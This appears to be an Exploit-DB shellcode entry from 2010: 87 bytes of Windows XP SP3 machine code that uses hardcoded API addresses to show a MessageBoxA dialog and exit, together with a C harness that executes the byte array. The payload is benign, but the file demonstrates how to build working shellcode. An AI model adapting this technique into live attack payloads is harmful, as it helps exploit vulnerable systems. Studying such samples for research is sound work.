/*
Title: Windows XP SP3 English MessageBoxA Shellcode (87 bytes)
Date: August 20, 2010
Author: Glafkos Charalambous (glafkos[@]astalavista[dot]com)
Tested on: Windows XP SP3 En
Thanks: ishtus
Greetz: Astalavista, OffSEC, Exploit-DB

Exploit-DB Notes:
Tested under Windows XP SP3 Eng
The correct memory address for GetProcAddress() appears to be different on our test machine,
which is 0x7c80ae30.
*/

#include <stdio.h>

char shellcode[] =
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2"
"\x51\x68\x6c\x6c\x20\x20\x68\x33"
"\x32\x2e\x64\x68\x75\x73\x65\x72"
"\x89\xe1\xbb\x7b\x1d\x80\x7c\x51" // 0x7c801d7b ; LoadLibraryA(user32.dll)
"\xff\xd3\xb9\x5e\x67\x30\xef\x81"
"\xc1\x11\x11\x11\x11\x51\x68\x61"
"\x67\x65\x42\x68\x4d\x65\x73\x73"
"\x89\xe1\x51\x50\xbb\x40\xae\x80" // 0x7c80ae40 ; GetProcAddress(user32.dll, MessageBoxA)
"\x7c\xff\xd3\x89\xe1\x31\xd2\x52"
"\x51\x51\x52\xff\xd0\x31\xc0\x50"
"\xb8\x12\xcb\x81\x7c\xff\xd0";    // 0x7c81cb12 ; ExitProcess(0)

int main(int argc, char **argv)
{
   int (*func)();
   func = (int (*)()) shellcode;
   printf("Shellcode Length is : %d",strlen(shellcode));
   (int)(*func)();

}